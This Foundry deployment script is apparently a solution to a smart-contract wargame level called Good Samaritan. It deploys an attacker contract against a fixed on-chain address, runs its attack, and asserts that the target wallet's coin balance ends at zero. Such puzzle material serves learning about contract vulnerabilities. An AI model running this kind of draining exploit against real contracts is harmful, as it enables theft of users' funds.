// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/Level27.sol";
import "../src/Level27-Attacker.sol";

contract AttackerScript is Script {
    GoodSamaritan public goodSamaritan = GoodSamaritan(0xcF13c10689F618B522dBAD3756Cf72284b7A386B);
    Wallet public wallet = Wallet(goodSamaritan.wallet());
    Coin public coin = Coin(goodSamaritan.coin());
    Level27Attacker public attacker;

    address bob = vm.addr(1); // exploiter address here

    function run() public {
      vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
      attacker = new Level27Attacker(address(goodSamaritan));
      attacker.attack();
      assert(coin.balances(address(wallet)) == 0);
      vm.stopBroadcast();
    }
}